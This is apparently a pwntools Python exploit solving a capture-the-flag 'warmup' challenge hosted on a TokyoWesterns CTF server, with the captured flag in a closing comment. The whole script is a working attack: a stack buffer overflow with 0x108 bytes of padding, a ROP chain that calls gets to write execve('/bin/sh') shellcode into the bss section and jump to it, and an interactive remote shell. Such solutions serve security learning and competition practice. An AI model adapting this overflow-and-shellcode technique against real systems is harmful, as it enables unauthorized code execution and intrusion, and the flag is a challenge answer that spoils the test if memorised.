from pwn import *

prog = ELF('warmup')
local = False
host = 'localhost' if local else 'nothing.chal.ctf.westerns.tokyo'
port = 2323 if local else 10001


if __name__=='__main__':
    shellcode=b"\x31\xc0\x48\xbb\xd1\x9d\x96\x91\xd0\x8c\x97\xff\x48\xf7\xdb\x53\x54\x5f\x99\x52\x57\x54\x5e\xb0\x3b\x0f\x05" 
    pad_len=0x108
    pop_rdi=0x400773
    bss=prog.symbols[b'__bss_start']
    plt_gets = prog.plt[b'gets']
    s= remote(host, port)
    s.recvuntil(':)\n')
    s.send(b'#'*pad_len+p64(pop_rdi)+p64(bss)+p64(plt_gets)+p64(bss)+b'\n'+shellcode)
    s.interactive()

# TWCTF{AAAATsumori---Shitureishimashita.}
